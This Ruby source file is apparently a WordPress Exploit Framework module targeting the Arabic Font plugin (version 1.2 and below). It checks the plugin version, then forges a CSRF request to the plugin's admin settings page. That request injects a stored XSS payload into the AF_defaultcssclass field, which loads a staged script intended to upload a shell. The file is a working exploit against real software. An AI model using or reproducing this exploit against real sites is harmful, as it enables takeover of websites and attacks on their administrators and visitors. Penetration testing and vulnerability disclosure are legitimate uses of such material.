# frozen_string_literal: true

class Wpxf::Exploit::ArabicFontCsrfStoredXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StagedReflectedXss

  def initialize
    super

    update_info(
      name: 'Arabic Font <= 1.2 CSRF Stored XSS Shell Upload',
      author: [
        'rastating'  # Discovery + WPXF module
      ],
      references: [
        ['WPVDB', '8868'],
        ['URL', 'https://www.rastating.com/arabic-font-1-2-csrf-stored-xss']
      ],
      date: 'Jul 18 2017'
    )
  end

  def check
    check_plugin_version_from_readme('arabic-font', '1.2.1')
  end

  def initial_script
    create_basic_post_script(
      normalize_uri(wordpress_url_admin, 'admin.php?page=arabic-font%2Finc%2Finit.php'),
      'save1'              => 'Save changes',
      'AF_fontfamily'      => 'JF Flat Jozoor',
      'AF_fontsize'        => '18',
      'AF_lineheight'      => '45',
      'AF_textalign'       => 'Center',
      'AF_defaultcssclass' => ".arab\\\"><script>#{xss_ascii_encoded_include_script}<\\/script><input+type=\\\"hidden\\\"+value=\\\"",
      'AF_customcss'       => '',
      'action'             => 'save'
    )
  end
end
